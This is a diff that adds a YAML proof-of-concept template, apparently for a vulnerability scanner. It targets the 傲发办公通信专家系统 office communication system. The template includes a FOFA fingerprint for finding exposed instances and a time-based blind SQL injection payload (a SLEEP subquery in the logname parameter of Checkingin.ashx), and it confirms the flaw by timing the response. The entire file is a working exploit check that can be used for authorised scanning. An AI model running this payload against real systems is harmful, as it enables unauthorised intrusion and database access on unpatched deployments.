@@ -1,0 +1,20 @@
+id: poc-yaml-aofax-checkingin-ashx-sqli
+info:
+  name: 傲发办公通信专家系统 Checkingin.ashx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 傲发办公通信专家系统
+  fofa: body="getincommingcall"
+variables:
+  t1: random_int(4,9)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /
+  expression: status_code == 200 && contains(body,"getincommingcall")
+- method: GET
+  path: /handle/Checkingin.ashx?type=checkingin&logname=%27+and+(SELECT+*+FROM+(SELECT(SLEEP({{.t1}})))x)+and+%27&date=1
+  expression: status_code == 200 && body == "0-0-0" && duration > t1 && duration <
+    t2
+transport: http
